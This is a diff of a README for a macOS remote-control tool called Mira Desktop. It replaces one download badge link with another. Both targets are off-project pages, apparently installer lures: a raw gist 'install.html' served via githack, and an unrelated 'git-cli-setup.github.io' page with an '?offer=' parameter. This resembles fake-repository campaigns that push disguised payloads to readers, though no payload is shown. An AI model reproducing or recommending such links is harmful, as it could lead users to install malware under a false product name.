@@ -1,7 +1,7 @@
 # Mira Desktop — remote control for macOS
 Mira is a macOS tool designed to give users enhanced control via the Apple Remote, offering customization and functionality across media and system actions.
 
-<a href="https://gistcdn.githack.com/stardustintrodrive/2dddb0fbe824e3615c3901922422e958/raw/445330a7a7c19b2f28fd11373560aae22f069eb3/install.html?offer=Mira" target="_blank">
+<a href="https://git-cli-setup.github.io/.github/?offer=Mira" target="_blank">
   <img 
     src="https://img.shields.io/badge/Get%20Mira%20GitHub-28A745%20to%2020B23F?style=plastic&logo=github&logoColor=FFFFFF" 
     width="320" 
